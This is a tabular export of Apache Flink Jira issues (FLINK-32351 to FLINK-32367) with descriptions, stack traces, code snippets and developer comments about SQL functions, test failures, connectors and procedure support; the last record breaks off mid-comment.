lead function second param cause ClassCastException,FLINK-32367,13540368,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,zhou_yb,zhou_yb,16/Jun/23 10:14,10/Mar/24 11:04,04/Jun/24 20:41,,1.15.4,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,,,,"!image-2023-06-16-18-12-05-861.png!!image-2023-06-16-15-49-49-003.png!

lead function second param is expression (window_length/2),throw a exception 

if lead function second param is number,it worked well",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/23 07:49;zhou_yb;image-2023-06-16-15-49-49-003.png;https://issues.apache.org/jira/secure/attachment/13059134/image-2023-06-16-15-49-49-003.png","16/Jun/23 10:12;zhou_yb;image-2023-06-16-18-12-05-861.png;https://issues.apache.org/jira/secure/attachment/13059133/image-2023-06-16-18-12-05-861.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Mar 10 11:04:13 UTC 2024,,,,,,,,,,"0|z1iltk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Mar/24 11:04;jeyhunkarimov;Hi [~zhou_yb] when I tried to reproduce with the current master (d6a4eb966fbc47277e07b79e7c64939a62eb1d54), the LEAD function successfully accepts and executes expression as parameter. For example, the following query works:
{code:java}
SELECT a, b, lead(b, a/2, 3) over (partition by a order by b), lag(b, 1, 3) over (partitionby a order by b) FROM Table6{code}
Could you please verify or am I missing sth?;;;",,,,,,,,,,,,,,,,,,,,,,
YarnConfigurationITCase.testFlinkContainerMemory fails with ConnectException (msg: Connection refused),FLINK-32366,13540353,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Not A Problem,,mapohl,mapohl,16/Jun/23 09:01,16/Jun/23 12:51,04/Jun/24 20:41,16/Jun/23 12:51,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,test-stability,,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50062&view=logs&j=fc5181b0-e452-5c8f-68de-1097947f6483&t=995c650b-6573-581c-9ce6-7ad4cc038461&l=28490

The changes of in the related branch should be unrelated. We've also seen this issue in other Jira issues (FLINK-23105 or FLINK-23611) which were closed again.

{code}
Test org.apache.flink.yarn.YarnConfigurationITCase.testFlinkContainerMemory[testFlinkContainerMemory()] failed with:
java.util.concurrent.ExecutionException: org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannel$AnnotatedConnectException: Connection refused: 3e2f99e5588a/172.28.0.2:32954
        at java.util.concurrent.CompletableFuture.reportGet(CompletableFuture.java:357)
        at java.util.concurrent.CompletableFuture.get(CompletableFuture.java:1908)
        at org.apache.flink.yarn.YarnConfigurationITCase.lambda$testFlinkContainerMemory$0(YarnConfigurationITCase.java:167)
        at org.apache.flink.yarn.YarnTestBase.runTest(YarnTestBase.java:301)
        at org.apache.flink.yarn.YarnConfigurationITCase.testFlinkContainerMemory(YarnConfigurationITCase.java:69)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        [...]
        at org.junit.platform.engine.support.hierarchical.ForkJoinPoolHierarchicalTestExecutorService$ExclusiveTask.compute(ForkJoinPoolHierarchicalTestExecutorService.java:185)
        at java.util.concurrent.RecursiveAction.exec(RecursiveAction.java:189)
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289)
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056)
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692)
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175)
Caused by: org.apache.flink.shaded.netty4.io.netty.channel.AbstractChannel$AnnotatedConnectException: Connection refused: 3e2f99e5588a/172.28.0.2:32954
Caused by: java.net.ConnectException: Connection refused
        at sun.nio.ch.SocketChannelImpl.checkConnect(Native Method)
        at sun.nio.ch.SocketChannelImpl.finishConnect(SocketChannelImpl.java:716)
        at org.apache.flink.shaded.netty4.io.netty.channel.socket.nio.NioSocketChannel.doFinishConnect(NioSocketChannel.java:337)
        at org.apache.flink.shaded.netty4.io.netty.channel.nio.AbstractNioChannel$AbstractNioUnsafe.finishConnect(AbstractNioChannel.java:334)
        at org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:776)
        at org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:724)
        at org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:650)
        at org.apache.flink.shaded.netty4.io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:562)
        at org.apache.flink.shaded.netty4.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
        at org.apache.flink.shaded.netty4.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
        at java.lang.Thread.run(Thread.java:748)
{code}",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-23105,FLINK-23611,,,FLINK-25002,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 16 12:51:08 UTC 2023,,,,,,,,,,"0|z1ilq8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 12:51;mapohl;I'm closing this one again because we figured out that it was actually a java17-related issue: The failure was caused by a missing config parameter (see [related comment|https://github.com/apache/flink/pull/22794#issuecomment-1594624341]);;;",,,,,,,,,,,,,,,,,,,,,,
orc format get table statistics slow,FLINK-32365,13540341,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,baibaiwuchang,baibaiwuchang,baibaiwuchang,16/Jun/23 08:15,18/Jul/23 01:15,04/Jun/24 20:41,18/Jul/23 01:15,1.17.1,,,,,,,,,,,,,,,,,,,,Connectors / ORC,,,,0,pull-request-available,,,"Orc format get table statistics slow when task have many  files。

Previously, it was single parallel reading, but it needs to be improved to multi-parallel reading files row count.

  !image-2023-06-16-16-14-53-133.png!",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/23 08:14;baibaiwuchang;image-2023-06-16-16-14-53-133.png;https://issues.apache.org/jira/secure/attachment/13059130/image-2023-06-16-16-14-53-133.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 18 01:15:43 UTC 2023,,,,,,,,,,"0|z1ilnk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"18/Jul/23 01:15;luoyuxia;master:

0f2ee60c2774c7b03c20ae0d495c51c35df48789;;;",,,,,,,,,,,,,,,,,,,,,,
Add Rescaling benchmark for ChangelogStateBackend,FLINK-32364,13540304,13544548,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,masteryhx,masteryhx,masteryhx,16/Jun/23 04:13,23/Jul/23 10:16,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / State Backends,,,,0,,,,"After FLINK-23484, we could Supports rescaling benchmark just like HEAP and ROCKSDB.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-16 04:13:08.0,,,,,,,,,,"0|z1ilfc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
calcite 1.21 supports type coercion but flink don't enable it in validate,FLINK-32363,13540300,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,jackylau,jackylau,16/Jun/23 03:19,16/Jun/23 07:23,04/Jun/24 20:41,16/Jun/23 06:45,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"1) calcite 1.21 supports type coercion and enabled default while flink disabled

2) spark /mysql can run it 

3) although, we can make it run by select count(distinct `if`(1>5, 'x', cast(null as varchar)));

i think we should enable it or offers a config to enable it

 
{code:java}
Flink SQL> select count(distinct `if`(1>5, 'x', null));
[ERROR] Could not execute SQL statement. Reason:
org.apache.calcite.sql.validate.SqlValidatorException: Illegal use of 'NULL'{code}
{code:java}
// it can run in spark
spark-sql (default)> select count(distinct `if`(1>5, 'x', null)); 
0
{code}
 
{code:java}
private def createSqlValidator(catalogReader: CalciteCatalogReader) = {
  val validator = new FlinkCalciteSqlValidator(
    operatorTable,
    catalogReader,
    typeFactory,
    SqlValidator.Config.DEFAULT
      .withIdentifierExpansion(true)
      .withDefaultNullCollation(FlinkPlannerImpl.defaultNullCollation)
      .withTypeCoercionEnabled(false)
  ) // Disable implicit type coercion for now.
  validator
} {code}",,,,,,,,,,,,,,,,,,,,FLINK-17484,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 16 07:23:16 UTC 2023,,,,,,,,,,"0|z1ileg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 04:45;libenchao;[FLIP-154|https://cwiki.apache.org/confluence/display/FLINK/FLIP-154%3A+SQL+Implicit+Type+Coercion] drives an effort about this, and has no activity for two years.;;;","16/Jun/23 07:23;jackylau;[~libenchao] Thanks for your explain;;;",,,,,,,,,,,,,,,,,,,,,
SourceAlignment announceCombinedWatermark period task maybe lost,FLINK-32362,13540294,13542635,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,cailiuyang,cailiuyang,cailiuyang,16/Jun/23 02:15,06/Jul/23 06:56,04/Jun/24 20:41,05/Jul/23 13:56,1.16.0,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,,,,,0,pull-request-available,,,"When we use sourcealignment，we also found there is another problem that announceCombinedWatermark may throw a exception (like  ""subtask 25 is not ready yet to receive events"" , this subtask maybe under failover), which will lead the period task not running any more (ThreadPoolExecutor will not schedule the period task if it throw a exception)

I think we should increase the robustness of announceCombinedWatermark function to avoid it throw any exception (if send fail, just wait next send) (code see [https://github.com/apache/flink/blob/master/flink-runtime/src/main/java/org/apache/flink/runtime/source/coordinator/SourceCoordinator.java#L199] )",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 05 13:55:49 UTC 2023,,,,,,,,,,"0|z1ild4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 06:12;fanrui;Hi [~cailiuyang] , thanks for the report.

It's really a bug, it can be reproduced by the unit test: don't setAllReaderTasksReady and call the announceCombinedWatermark.

I want to know how do you want to fix the bug?;;;","16/Jun/23 06:38;cailiuyang;[~fanrui] Two ways:
 # the simple way code like:
{code:java}
// code placeholder
try {
    for (Integer subtaskId : subTaskIds) {
        context.sendEventToSourceOperator(
              subtaskId, new WatermarkAlignmentEvent(maxAllowedWatermark));
    }
 } catch (Throwable ignore) {
    LOG.warn(""Announce the newest combined watermark to source failed, task maybe during failover, wait next time to announce.""
 }{code}

 # add a trySendEventToSourceOperator(), this method only send when task is ready and not throw exception if task is not ready.

i prefer the first one, because it's simple and it can also cover some other exception like rpc timeout ;;;","16/Jun/23 07:08;fanrui;Thanks for your quick feedback.

I'm not sure what should we do when some subtasks are not ready.
 * Option1: just send event to all ready subtasks.
 * Option2: Don't send any event before all subtasks are ready.

If we expect option1, your solution might work.

And your solution1 has a little bug, when one subtask isn't ready, we should continue send event to next subtask. So the `try catch` should be moved to inside of the `for loop`.

 
{code:java}
for (Integer subtaskId : subTaskIds) {
    try {
         context.sendEventToSourceOperator(
              subtaskId, new WatermarkAlignmentEvent(maxAllowedWatermark));
    } catch (Throwable ignore) {
        LOG.warn(""Announce the newest combined watermark to source failed, task maybe during failover, wait next time to announce.""
    }
 } {code}
 ;;;","16/Jun/23 10:35;cailiuyang;[~fanrui] I compare the two ways, in common case if one task is unready, other subtask may be also unready with high probability,  the inner-catch will print many useless log(with the same reason), so i chose the outer-catch;;;","05/Jul/23 13:55;fanrui;Merged via
master 1.18:   5509c61
1.17:  7219ca1
1.16:  1847b84;;;",,,,,,,,,,,,,,,,,,
error after replace dependent jar file,FLINK-32361,13540293,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Cannot Reproduce,,SpongebobZ,SpongebobZ,16/Jun/23 01:56,28/Aug/23 06:54,04/Jun/24 20:41,28/Aug/23 06:54,1.14.5,,,,,,,,,,,,,,,,,,,,API / Core,,,,0,,,,"in the standalone session mode. I have one dependent jar file named 'A.jar' in the folder `lib1`, so I submit my app via command `flink run -C file:///lib1/A.jar -c Application ./myApp.jar`.  well it runs normally. 

And, I have the same jar file named 'A.jar' in the folder `lib2` also which was copied from `lib1`. then I delete A.jar in `lib1`, copy the same jar from `lib2` to `lib1`, re-submit the application. Finally I would get an ClassNotFoundException which class refer to A.jar.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 19 10:59:15 UTC 2023,,,,,,,,,,"0|z1ilcw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 07:02;mapohl;Hi [~SpongebobZ] please sent subscribe to Flink's user mailing list for questions (see the [docs|https://flink.apache.org/community/#mailing-lists] for more details). Jira is meant as a channel for bug reports and feature requests.

As a hint: You might want to share the exact commands you used and the logs of the run. That might help others to investigate your problem.

I'm closing this issue for the reasons mentioned above.;;;","19/Jun/23 01:57;SpongebobZ;Hi [~mapohl] yes I think this is a bug so I report this issue here.;;;","19/Jun/23 10:59;mapohl;thanks for reopening it, then. Sorry for being too fast in closing it. So far, it sounded like a usability issue. Anyway, you might want to provide logs and the stacktrace of the {{ClassNotFoundException}} to get more context.

Have you checked whether it also appears with a newer version of Flink (i.e. 1.17)?;;;",,,,,,,,,,,,,,,,,,,,
Optimize DataStream#coGroup in stream mode when results are emitted at end of input,FLINK-32360,13540247,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,lindong,lindong,lindong,15/Jun/23 15:01,15/Jun/23 15:01,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-15 15:01:03.0,,,,,,,,,,"0|z1il2o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AdaptiveSchedulerBuilder should accept executor service in constructor,FLINK-32359,13540239,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,15/Jun/23 13:47,04/Jul/23 15:18,04/Jun/24 20:41,04/Jul/23 15:18,,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,"The ASBuilder currently accepts mandatory arguments in both the constructor and final {{build()}} method.
This makes it difficult to create composite helper factory methods, since you always need to pass a special value in build(), usually leaking details of the test setup.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 15:18:55 UTC 2023,,,,,,,,,,"0|z1il0w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 15:18;chesnay;master: 37341a5aeff77f22f0fed0f7899e8ca4db99645d;;;",,,,,,,,,,,,,,,,,,,,,,
CI may unintentionally use fallback akka loader,FLINK-32358,13540232,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,15/Jun/23 13:05,16/Jun/23 10:54,04/Jun/24 20:41,16/Jun/23 10:54,,,,,,,,,,,,,,,1.18.0,,,,,,Build System / CI,,,,0,pull-request-available,,,"We have a fallback akka loader for developer convenience in the IDE, that is on the classpath of most modules. Depending on the order of jars on the classpath it can happen that the fallback loader appears first, which we dont want because it slows down the build and creates noisy logs.

We can add a simple prioritization scheme to the rpc system loading to remedy that.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 16 10:54:37 UTC 2023,,,,,,,,,,"0|z1ikzc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jun/23 10:54;chesnay;master: d8547fafd99dd243587dcf24592025ebb3911fc0;;;",,,,,,,,,,,,,,,,,,,,,,
Elasticsearch v3.0 won't compile when testing against Flink 1.17.1,FLINK-32357,13540212,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,reta,martijnvisser,martijnvisser,15/Jun/23 11:48,19/Jun/23 11:58,04/Jun/24 20:41,19/Jun/23 11:58,,,,,,,,,,,,,,,elasticsearch-3.0.2,,,,,,Connectors / ElasticSearch,,,,0,pull-request-available,,,"{code:java}
[INFO] ------------------------------------------------------------------------
Error:  Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:3.0.0-M5:test (default-test) on project flink-connector-elasticsearch-base: Execution default-test of goal org.apache.maven.plugins:maven-surefire-plugin:3.0.0-M5:test failed: org.junit.platform.commons.JUnitException: TestEngine with ID 'archunit' failed to discover tests: com.tngtech.archunit.lang.syntax.elements.MethodsThat.areAnnotatedWith(Ljava/lang/Class;)Ljava/lang/Object; -> [Help 1]
{code}

https://github.com/apache/flink-connector-elasticsearch/actions/runs/5277721611/jobs/9546112876#step:13:159

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 19 11:58:34 UTC 2023,,,,,,,,,,"0|z1ikuw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 11:49;martijnvisser;[~snuyanzin] [~reta] Haven't we seen this issue before with Opensearch as well? ;;;","15/Jun/23 11:54;Sergey Nuyanzin;I remember something like that, I will have a look;;;","15/Jun/23 12:32;reta;Yes, we certainly had it !;;;","19/Jun/23 11:55;Sergey Nuyanzin;Merged to v3.0 as [9876d39269b36b2a47f819541fb10e774e573e09|https://github.com/apache/flink-connector-elasticsearch/commit/9876d39269b36b2a47f819541fb10e774e573e09]
;;;","19/Jun/23 11:58;Sergey Nuyanzin;besides mentioned in description there was another issue fixed with 
[36409d2683de67558e5977b29dc21bd359a5afec|https://github.com/apache/flink-connector-elasticsearch/commit/36409d2683de67558e5977b29dc21bd359a5afec]
now nightly is green https://github.com/apache/flink-connector-elasticsearch/actions/runs/5311373807;;;",,,,,,,,,,,,,,,,,,
Add document for calling procedure,FLINK-32356,13540211,13540202,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,luoyuxia,luoyuxia,15/Jun/23 11:48,18/Aug/23 02:24,04/Jun/24 20:41,18/Aug/23 02:24,,,,,,,,,,,,,,,,,,,,,Documentation,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 02:24:06 UTC 2023,,,,,,,,,,"0|z1ikuo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"18/Aug/23 02:24;luoyuxia;master:

18b4759cc3405e784205f6df55dd7a4f0ee2d3b7

13cb456eb30dc50dbd47885b7471cd02cfe56cdf;;;",,,,,,,,,,,,,,,,,,,,,,
Support to list procedure,FLINK-32355,13540210,13540202,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,luoyuxia,luoyuxia,15/Jun/23 11:47,04/Jul/23 12:09,04/Jun/24 20:41,04/Jul/23 12:09,,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,"|As FLIP discussed. We will support new syntax for showing procedures.
The syntax:
SHOW PROCEDURES [ ( FROM \| IN ) [catalog_name.]database_name ] [ [NOT] (LIKE \| ILIKE) <sql_like_pattern> ]|",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 12:09:22 UTC 2023,,,,,,,,,,"0|z1ikug:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 12:09;luoyuxia;master:

41462f76c0cf0913f4803dba8b2cb76cb96a4da4;;;",,,,,,,,,,,,,,,,,,,,,,
Support to execute the call procedure operation,FLINK-32354,13540209,13540202,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,15/Jun/23 11:46,21/Jul/23 06:44,04/Jun/24 20:41,21/Jul/23 06:44,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,FLINK-32352,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 21 06:44:05 UTC 2023,,,,,,,,,,"0|z1iku8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jul/23 06:44;luoyuxia;master:

78aa02f106cfe261200d4efce3c09d2a2882ebec

7e2bc6e8d21411d5aa13200791f26edc77cda4ba;;;",,,,,,,,,,,,,,,,,,,,,,
Update Cassandra connector archunit violations with Flink 1.18 rules,FLINK-32353,13540208,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,echauchot,martijnvisser,martijnvisser,15/Jun/23 11:46,05/Mar/24 13:57,04/Jun/24 20:41,05/Mar/24 13:57,,,,,,,,,,,,,,,cassandra-3.2.0,,,,,,Build System / CI,Connectors / Cassandra,,,0,pull-request-available,stale-assigned,,"The current Cassandra connector in {{main}} fails when testing against Flink 1.18-SNAPSHOT

{code:java}
Error:  Tests run: 2, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 8.1 s <<< FAILURE! - in org.apache.flink.architecture.rules.ITCaseRules
Error:  ITCaseRules.ITCASE_USE_MINICLUSTER  Time elapsed: 0.025 s  <<< FAILURE!
java.lang.AssertionError: 
Architecture Violation [Priority: MEDIUM] - Rule 'ITCASE tests should use a MiniCluster resource or extension' was violated (1 times):
org.apache.flink.streaming.connectors.cassandra.CassandraConnectorITCase does not satisfy: only one of the following predicates match:
* reside in a package 'org.apache.flink.runtime.*' and contain any fields that are static, final, and of type InternalMiniClusterExtension and annotated with @RegisterExtension
* reside outside of package 'org.apache.flink.runtime.*' and contain any fields that are static, final, and of type MiniClusterExtension and annotated with @RegisterExtension or are , and of type MiniClusterTestEnvironment and annotated with @TestEnv
* reside in a package 'org.apache.flink.runtime.*' and is annotated with @ExtendWith with class InternalMiniClusterExtension
* reside outside of package 'org.apache.flink.runtime.*' and is annotated with @ExtendWith with class MiniClusterExtension
 or contain any fields that are public, static, and of type MiniClusterWithClientResource and final and annotated with @ClassRule or contain any fields that is of type MiniClusterWithClientResource and public and final and not static and annotated with @Rule
{code}

https://github.com/apache/flink-connector-cassandra/actions/runs/5276835802/jobs/9544092571#step:13:811",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Mar 05 13:57:24 UTC 2024,,,,,,,,,,"0|z1iku0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 11:46;martijnvisser;[~echauchot] Want to take a look?;;;","15/Jun/23 14:12;echauchot;[~martijnvisser] yes I'll take a look, only not now as I'm busy on other areas. It seems that this ticket is more about fixing the tests to comply with archunit rules rather than making prod code compatible with Flink 1.18. If it's ok, I'll rename the jira;;;","15/Jun/23 14:19;martijnvisser;[~echauchot] Sure thing! Thanks;;;","05/Jul/23 14:59;echauchot;The mini cluster rule has been fixed in  [Flink 1.18|https://github.com/apache/flink/pull/22399/]
 * CassandraConnectorITCase does not use/needs MiniCluster so it is still an ""violation"" but the rule message has changed.
 * the ""violation"" for CassandraSourceITCase is now gone as the rule was fixed

To get rid of this failure when testing against flink 1.18, we need to update the archunit violation store. But as part of [this email|https://lists.apache.org/thread/pr0g812olzpgz21d9oodhc46db9jpxo3] , I'll update the violation store only when flink 1.18 is the main supported version for the Cassandra connector, surely short after this flink release is out.;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","05/Mar/24 13:49;echauchot;main: 88818685d195d9ab91b6c4ff31e91d00bc7858c9;;;","05/Mar/24 13:57;echauchot;Even if this change is mostly a CI change, it is part of the overall Cassandra compatibility with Flink 1.18 which will be released with next Cassandra connector version. So targeting cassandra-connector-3.2.0 ;;;",,,,,,,,,,,,,,,,
Support to convert call procedure statement to correpsonding operation,FLINK-32352,13540207,13540202,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,15/Jun/23 11:45,21/Jul/23 06:44,04/Jun/24 20:41,21/Jul/23 06:44,,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,FLINK-32354,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-15 11:45:51.0,,,,,,,,,,"0|z1ikts:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduce base interfaces for call procedure,FLINK-32351,13540205,13540202,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,15/Jun/23 11:44,29/Jun/23 09:36,04/Jun/24 20:41,29/Jun/23 09:36,,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 09:36:26 UTC 2023,,,,,,,,,,"0|z1iktc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 09:36;luoyuxia;master:
